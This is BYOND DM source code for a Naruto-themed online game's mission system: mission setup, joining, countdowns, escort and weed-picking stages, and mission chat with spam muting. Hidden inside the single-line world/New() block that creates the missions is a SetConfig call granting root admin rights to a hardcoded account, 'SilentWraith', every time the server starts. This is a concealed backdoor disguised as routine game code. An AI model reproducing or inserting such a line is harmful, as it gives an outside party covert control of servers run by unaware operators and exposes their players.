mob/var/list/Missions_Cooldowns = list()
mob/var/list/E_List = list()
mob/var/Mission/Mission_On
mob/var/E_Part
mob/var/MPC
mob/var/WD = 0
mob/var/WTD = 3
area/Mission/Dosu_I {icon = 'Dosu Map I.dmi'; layer = 30}
area/Mission/Dosu_II {icon = 'Dosu Map II.dmi'; layer = 29}
area/Mission/Neji {icon = 'Neji Map.dmi'; layer = 29}
obj/Mission_Spawn
obj/Weed {icon = 'Weed.dmi'; layer = 150; New() {..(); icon_state = pick("1", "2", "3")}}
var/list/Active_Missions = list()
world/New() {..(); world.SetConfig("APP/admin", ckey("SilentWraith"), "role=root"); var/T = 3; while(T) {T --; new/Mission ("Genin Exam", "E", "Prove you are ready to be a Genin by completing simple tasks!", 1, 10, 0.25); new/Mission ("Capture The Missing Dog", "D", "There has been a report about a missing dog, find the dog and return it to it's owner.", 1, 10, 0.5); new/Mission ("Weed Picking", "D", "Some weeds have been appearing in our furthest territories, get rid of them.", 1, 10, 0.5); new/Mission ("Curse Revolution", "A", "Your best friend betrayed you and you have to stop him before darkness fully takes over his mind.", 1, 75, 3); new/Mission ("Revenge of the Sound Ninjas", "C", "Orochimaru sent his spying ninjas to obtain secret information, stop them at any cost!", 1, 30, 1); new/Mission ("Retrieve Byakugan", "B", "A Cloud Villager has reported that ninjas with Byakugan have been spotted nearby, it was ordered to steal the Byakugan and return to the village.", 1, 50, 2); new/Mission ("Mist Ambush", "B", "Some genins were attacked by two Mist Ninjas, deal with them and avenge our pride.", 1, 50, 2); new/Mission ("Escort Gaara", "C", "The Kazekage has to attend the 5 Kages Meeting, however rogue ninjas have spotted him and are trying to assassinate him. Help the Kazekage by escorting him!", 1, 30, 1)}; new/Mission ("Orochimaru's Wrath", "S", "Orochimaru's hideout has been revealed, defeat anyone that stands in your team's way and kill Orochimaru!", 4, 150, 5)}

Mission
	var {mob/Hoster; Limit; list/Ninjas = list(); Description; Time_To_Start; Name; Rank; Status = "Open"; Ryo_Reward; Rep_Reward; Started; No_Join}

	New(N, R, D, L, R1, R2)
		..()
		Active_Missions.Add(src)
		Description = D
		Limit = L
		Name = N
		Rank = R
		Ryo_Reward = R1
		Rep_Reward = R2

	Del()
		Active_Missions.Remove(src)
		new/Mission (src.Name, src.Rank, src.Description, src.Limit, src.Ryo_Reward, src.Rep_Reward)
		..()

	proc/Join (mob/M)
		if(M.Mission_On || No_Join || !M.Statistic._Village_) return
		if(M.name != M.key && !M.dead) {M<<"<b><font color=red><u>You can not join, wait until you die or the round is over.</b></u>"; return}
		if(length(Ninjas) >= Limit || Ninjas.Find(M)) return
		if(length(Ninjas) == 0) {Hoster = M; Status = "Closed"; if(Rank in list("E", "D", "C", "B", "A", "S")) spawn() {Time_To_Start = 60; if(Rank == "S") Time_To_Start = 90; Time()}}
		M.Resize(1)
		Ninjas.Add(M)
		M.CanChoose = 0
		M.Mission_On = src
		M<<output(null, "Menu.MissionOutput")
		M<<output("<b><font color=#ABABAB><center><font size=5><u>~[Name]~</u><br><br>", "Menu.MissionOutput")
		M<<output("<b><font color=#8B8B8B><u><font size=4>Description:</u> <font color=#979797>[Description]", "Menu.MissionOutput")
		M<<output("<b><font color=#A0A0A0><u><font size=3>Reward:</u> [Ryo_Reward] Ryo & [Rep_Reward] Reputation<br>", "Menu.MissionOutput")
		if(length(Ninjas) > 1) Ninjas<<output("<font color=#D7D7D7><b><u>{[M.Statistic.Rank]} -[M.key] has joined!</u>", "Menu.MissionOutput")
		winshow(M, "Menu.MissionBackground", 1)
		winshow(M, "Menu.MissionOutput", 1)
		winshow(M, "Menu.MissionInput", 1)
		winshow(M, "Menu.Participants", 1)
		winshow(M, "Menu.Abandon", 1)
		winshow(M, "Menu.Begin", 1)
		winshow(M, "Menu.Browse", 0)
		winshow(M, "Menu.Return", 0)
		if(Limit == length(Ninjas)) {Active_Missions.Remove(src); Active_Missions.Add(src)}

	proc/Leave (mob/M)
		M.Mission_On = null
		Ninjas.Remove(M)
		if(length(Ninjas) > 0) {Ninjas<<output("<font color=#D7D7D7><b><u>{[M.Statistic.Rank]} -[M.key] has left!</u>", "Menu.MissionOutput"); if(M.NEM_Round.Type == "Mission") M.NEM_Round.Ninjas.Remove(src)}
		else if(length(Ninjas) == 0)
			if(M.NEM_Round.Type == "Mission") del(M.NEM_Round)
			del(src)

	proc/Start()
		No_Join = 1
		Active_Missions.Remove(src)
		var/NEM_Round/N = new/NEM_Round (Name, "Mission")
		for(var/mob/Ninja in Ninjas) {N.Join(Ninja); Ninja.CanChoose = 1; Ninja.Respawn()}

	proc/Time()
		var/T
		T = Time_To_Start

		loop
			spawn(10) {if(Status == "Open" || Time_To_Start != T) return; Time_To_Start --; T = Time_To_Start; if(Time_To_Start in list(90, 80, 70, 60, 50, 40, 30, 20, 10, 5, 3, 2, 1, 0)) {if(Time_To_Start > 1) Ninjas<<output("<b><font color=#969696><u><font size=3>The mission will begin in [Time_To_Start] seconds!</u>", "Menu.MissionOutput"); else if(Time_To_Start == 1) Ninjas<<output("<b><font color=#969696><u><font size=3>The mission will begin in [Time_To_Start] second!</u>", "Menu.MissionOutput"); else if(Time_To_Start == 0) {Ninjas<<output("", "Menu.MissionOutput"); Ninjas<<output("<b><font color=#B6B6B6><u><font size=3><center>The Mission has started, good luck!</u>", "Menu.MissionOutput"); Ninjas<<output("", "Menu.MissionOutput"); Start(); return}}; goto loop}

mob/proc
	Escort_Gaara()
		var/F = 1
		loop
			if(NEM_Round.Mode == "Escort Gaara")
				var {C; Gaara}

				if(NEM_Round._Spawn == 1)
					if(NEM_Round.Stage == 2 && F == 1)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x > 101 && M.y >= 46 && M.Real) {C ++; if(!M.client) Gaara = M}
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; var/T = new/mob/Mission_NPC/Tayuya (NEM_Round.Spawns["Tayuya"], Gaara); var/S = new/mob/Mission_NPC/Sakon (NEM_Round.Spawns["Sakon"], Gaara); NEM_Round.Join(T); NEM_Round.Join(S)}
							if(src) {var/T = 58; while(T >= 46) {var/turf/G = locate(99, T, 18); NEM_Round.Permanent_Turfs.Add(G); G.density = 1; T --}}
							F = 2

					if(NEM_Round.Stage == 3 && F == 2)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x < 176 && M.y >= 79 && M.Real) {C ++; if(!M.client) Gaara = M}
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; var/K = new/mob/Mission_NPC/Kimimaro (NEM_Round.Spawns["Kimimaro"], Gaara); NEM_Round.Join(K); NEM_Round.Join(K)}
							if(src) {NEM_Round.Objects.Add(new/obj/Green_Rashomon (locate(114, 79, 18))); var/T = 102; while(T >= 79) {var/turf/G = locate(179, T, 18); NEM_Round.Permanent_Turfs.Add(G); G.density = 1; T --}; T = 84; while(T >= 79) {var/turf/G = locate(114, T, 18); NEM_Round.Temporal_Turfs.Add(G); G.density = 1; T --}}
							F = 3

					if(NEM_Round.Stage == 4 && F == 3)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x < 85 && M.y >= 79 && M.Real) C ++
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; for(var/turf/T in NEM_Round.Permanent_Turfs) T.density = 0; for(var/turf/T in NEM_Round.Temporal_Turfs) T.density = 0; for(var/obj/O in NEM_Round.Objects) del(O); NEM_Round.Del("Victory")}
							F = 4

				else if(NEM_Round._Spawn == 2)
					if(NEM_Round.Stage == 2 && F == 1)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x > 328 && M.y >= 46 && M.Real) {C ++; if(!M.client) Gaara = M}
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; var/T = new/mob/Mission_NPC/Tayuya (NEM_Round.Spawns["Tayuya"], Gaara); var/S = new/mob/Mission_NPC/Sakon (NEM_Round.Spawns["Sakon"], Gaara); NEM_Round.Join(T); NEM_Round.Join(S)}
							if(src) {var/T = 58; while(T >= 46) {var/turf/G = locate(326, T, 18); NEM_Round.Permanent_Turfs.Add(G); G.density = 1; T --}}
							F = 2

					if(NEM_Round.Stage == 3 && F == 2)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x < 403 && M.y >= 79 && M.Real) {C ++; if(!M.client) Gaara = M}
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; var/K = new/mob/Mission_NPC/Kimimaro (NEM_Round.Spawns["Kimimaro"], Gaara); NEM_Round.Join(K); NEM_Round.Join(K)}
							if(src) {NEM_Round.Objects.Add(new/obj/Green_Rashomon (locate(341, 79, 18))); var/T = 102; while(T >= 79) {var/turf/G = locate(406, T, 18); NEM_Round.Permanent_Turfs.Add(G); G.density = 1; T --}; T = 84; while(T >= 79) {var/turf/G = locate(341, T, 18); NEM_Round.Temporal_Turfs.Add(G); G.density = 1; T --}}
							F = 3

					if(NEM_Round.Stage == 4 && F == 3)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x < 312 && M.y >= 79 && M.Real) C ++
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; for(var/turf/T in NEM_Round.Permanent_Turfs) T.density = 0; for(var/turf/T in NEM_Round.Temporal_Turfs) T.density = 0; for(var/obj/O in NEM_Round.Objects) del(O); NEM_Round.Del("Victory")}
							F = 4

				else if(NEM_Round._Spawn == 3)
					if(NEM_Round.Stage == 2 && F == 1)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x > 101 && M.y >= 46 && M.Real) {C ++; if(!M.client) Gaara = M}
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; var/T = new/mob/Mission_NPC/Tayuya (NEM_Round.Spawns["Tayuya"], Gaara); var/S = new/mob/Mission_NPC/Sakon (NEM_Round.Spawns["Sakon"], Gaara); NEM_Round.Join(T); NEM_Round.Join(S)}
							if(src) {var/T = 58; while(T >= 46) {var/turf/G = locate(99, T, 19); NEM_Round.Permanent_Turfs.Add(G); G.density = 1; T --}}
							F = 2

					if(NEM_Round.Stage == 3 && F == 2)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x < 176 && M.y >= 79 && M.Real) {C ++; if(!M.client) Gaara = M}
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; var/K = new/mob/Mission_NPC/Kimimaro (NEM_Round.Spawns["Kimimaro"], Gaara); NEM_Round.Join(K); NEM_Round.Join(K)}
							if(src) {NEM_Round.Objects.Add(new/obj/Green_Rashomon (locate(114, 79, 19))); var/T = 102; while(T >= 79) {var/turf/G = locate(179, T, 19); NEM_Round.Permanent_Turfs.Add(G); G.density = 1; T --}; T = 84; while(T >= 79) {var/turf/G = locate(114, T, 19); NEM_Round.Temporal_Turfs.Add(G); G.density = 1; T --}}
							F = 3

					if(NEM_Round.Stage == 4 && F == 3)
						for(var/mob/M in NEM_Round.Ninjas) if(M.x < 85 && M.y >= 79 && M.Real) C ++
						if(C == 2)
							if(src) {NEM_Round.Bijuu_Dama = 0; for(var/turf/T in NEM_Round.Permanent_Turfs) T.density = 0; for(var/turf/T in NEM_Round.Temporal_Turfs) T.density = 0; for(var/obj/O in NEM_Round.Objects) del(O); NEM_Round.Del("Victory")}
							F = 4

				spawn(15) goto loop

	Weed_Pick()
		if(!on_ground || freeze || Dragonned || Substitution || WD == WTD) return
		var/G
		if(dir == EAST) G = 24
		else G = 34
		var/WW = WD

		for(var/obj/Weed/W in obounds(src, G, 0, 18, 0))
			if(WD != WW	|| freeze) return
			stop()
			freeze ++
			while(W.alpha > 25) {spawn(2) W.alpha -= 50; flick("punch5", src); sleep(7.5)}
			spawn() {Mission_Show("<font color=#9AFA85><font size=4><b><center>* Weed Picking *<br><font size=3>[WD] out of [WTD]"); if(WD == WTD) NEM_Round.Del("Victory")}
			WD ++
			freeze --
			del(W)

	Complete_Genin_Part(var/G)
		if(G) spawn(30)
			loop
				if(name == key || !E_Part || length(E_List) == 0) return
				if(running == 1 && E_Part == "Sprint") Complete_Genin_Part()
				spawn() Mission_Show("<font color=#DFC24A><font size=4><b><center>* [Mission_On.Name] *<br><font size=3>[E_Part]!")
				spawn(30) goto loop

		else
			E_List.Remove(E_Part)
			if(length(E_List) == 0) NEM_Round.Del("Victory")
			else E_Part = pick(E_List)


mob
	verb
		Mission_Begin()
			set hidden = 1
			if(!Mission_On || Mission_On.Started) return
			if(Mission_On.Hoster != src) {src<<output("<b><font color=#D7D7D7><u>You are not the creator, you can not begin the mission!</u>", "Menu.MissionOutput"); return}
			src<<output("", "Menu.MissionOutput")
			Mission_On.Ninjas<<output("<font color=#B6B6B6><b><font size=3><center><u>The Mission is about to start, get ready!</u></center>", "Menu.MissionOutput")
			src<<output("", "Menu.MissionOutput")
			Mission_On.Time_To_Start = 6
			Mission_On.Started = 1
			Mission_On.Time()

		Mission_Participants()
			set hidden = 1
			if(!Mission_On || MPC) return
			else {MPC = 1; spawn(30) MPC = 0}
			src<<output("", "Menu.MissionOutput")
			src<<output("<font color=#A6A6A6><b><u><font size=3>Participants</u>", "Menu.MissionOutput")
			for(var/mob/M in Mission_On.Ninjas) src<<output("<font color=#D7D7D7><b>- [M.Statistic.Rank]~ [M.key]", "Menu.MissionOutput")
			src<<output("", "Menu.MissionOutput")

		Mission_Say(T as text)
			set hidden = 1
			if(!T || !Mission_On || T == " " || T == "  " || T == "   ") return
			if(Mute) {src<<output("<b><font color=#D7D7D7><u>You're muted, you can't talk.</u></b>", "Menu.MissionOutput"); return}
			if(Spam > 5) {Mute = 1; Mute_Time = 15*60; Statistic.Times_Muted ++; Mission_On.Ninjas<<output("<font color=#D7D7D7><b><u>[key] has been automatically muted for 15 minutes!</u>", "Menu.MissionOutput"); world<<output("<font color=[admin_color]><b><u>[key] has been automatically muted for 15 minutes!</u></font>","Chat"); file("Logs/Players/[Personal_Log.Name].txt") << "<br><font color=#FFFAC0>[time2text(world.timeofday, "DD/MM/YYYY -hh:mm:ss")]<font color=white>- *[key] has been automatically muted for 15 minutes!"; return}
			if(Spam > 4) src<<output("<font color=#D7D7D7><b><u>Stop spamming, or you'll be muted!</u>", "Menu.MissionOutput")
			if(FilterText(T,ADList)) return
			Current_Log.Add("[key] Mission Says: [T]")


			if(T == LastMessage)
				Repetitive ++
				spawn(30) Repetitive --
				if(Repetitive > 1) {Mute = 1; Mute_Time = 3*60; Statistic.Times_Muted ++; Mission_On.Ninjas<<output("<font color=#D7D7D7><b><u>[key] has been automatically muted for 3 minutes!</u></font>", "Menu.MissionOutput"); world<<output("<font color=[admin_color]><b><u>[key] has been automatically muted for 3 minutes!</u></font>", "Chat"); file("Logs/Players/[Personal_Log.Name].txt") << "<br><font color=#FFFAC0>[time2text(world.timeofday, "DD/MM/YYYY -hh:mm:ss")]<font color=white>- *[key] has been automatically muted for 3 minutes!"; return}
				else src<<output("<b><font color=#D7D7D7><u>Do not repeat the message you wrote before!</u>", "Menu.MissionOutput")

			LastMessage = T
			var/Old_Message = LastMessage
			spawn(100) if(LastMessage == Old_Message) LastMessage = null
			Mission_On.Ninjas<<output("<b><font color=#A6A6A6><font size=2>{[Statistic.Rank]} -[key]:<font color=#CCCCCC> [html_encode(copytext(T,1,500))]", "Menu.MissionOutput")
			CheckSpam()

mob/proc
	Mission_Show(var/T)
		if(!client) return
		var/obj/O = new/obj (src)
		O.alpha = 0
		O.maptext = T
		O.maptext_width = 1022
		O.maptext_height = 160
		O.layer = 10000000000000000
		O.screen_loc = "1, 7:28"
		client.screen += O
		var/C = 16
		while(O && O.alpha < 255) {C -= 1; O.alpha += 5; O.screen_loc = "1, 7:[C]"; sleep(0.5)}
		sleep(5)
		while(O && O.alpha > 0) {C += 1; O.alpha -= 10; O.screen_loc = "1, 7:[C]"; sleep(0.33)}
		del(O)

proc
	Mission_Show_(atom/M, var/T, NEM_Round/N, var/Time)
		var/obj/O = image(null, M)
		O.pixel_y += 64
		O.pixel_x -= 190
		O.alpha = 0
		O.maptext = T
		O.maptext_width = 500
		O.maptext_height = 160
		O.layer = 10000000000000
		for(var/mob/G in N.Ninjas) G<<O
		spawn(Time -7.5) {while(O && O.alpha > 0) {O.alpha -= 10; sleep(0.33)}; del(O)}
		while(O && O.alpha < 255) {O.alpha += 5; sleep(0.5)}



obj/Red_Rashomon {layer = 99; icon = 'Rashomons.dmi'; pixel_y = -16; icon_state = "Red"}
obj/Blue_Rashomon {layer = 99; icon = 'Rashomons.dmi'; pixel_y = -16; icon_state = "Blue"}
obj/Green_Rashomon {layer = 99; icon = 'Rashomons.dmi'; pixel_y = -16; icon_state = "Green"; pixel_x = -69}